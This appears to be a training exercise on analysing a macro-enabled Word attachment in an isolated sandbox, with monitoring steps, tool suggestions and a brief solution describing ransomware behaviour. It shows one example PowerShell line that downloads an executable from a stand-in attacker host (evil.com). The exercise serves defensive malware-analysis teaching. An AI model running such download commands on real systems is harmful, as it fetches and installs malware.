# Reverse-Engineer a Malicious Attachment (Macro-Enabled Word Doc) in a Sandbox

**Objective**: Extract the payload from a macro-enabled Word document and determine its behavior.

**Difficulty**: 6/9  
**Time**: 65 minutes

## Steps

1. **Setup Sandbox**  
   - Configure a virtual machine (e.g., Windows 10 on VirtualBox) with no network access to isolate the environment.

2. **Open Document**  
   - Open the macro-enabled Word document in the sandbox.  
   - Enable macros in a monitored environment, using tools like Process Monitor to capture activity.

3. **Monitor Activity**  
   - Use Sysinternals tools (e.g., Procmon, Process Explorer) to log:  
     - File system changes  
     - Registry modifications  
     - Network connection attempts

4. **Extract Payload**  
   - If macros execute a PowerShell command (e.g., `IWR http://evil.com/malware.exe`), capture the command.  
   - Use `oledump.py` to extract and analyze VBA macro code from the document.

5. **Analyze Payload**  
   - If the payload is a downloader, simulate the request in a controlled environment (e.g., using `curl` on a Linux VM) to retrieve the binary safely.

6. **Determine Behavior**  
   - Analyze the binary using tools like `strings` or a disassembler (e.g., IDA Free) to identify:  
     - Persistence mechanisms (e.g., registry keys)  
     - Command-and-control (C2) communication patterns

7. **Report**  
   - Summarize the payload type and behavior.  
   - Example: “Downloads ransomware, connects to 192.168.1.100.”

## Solution

The macro downloads an executable (EXE) from a command-and-control (C2) server. The payload establishes persistence (e.g., via registry modifications) and performs data encryption, indicating ransomware behavior.
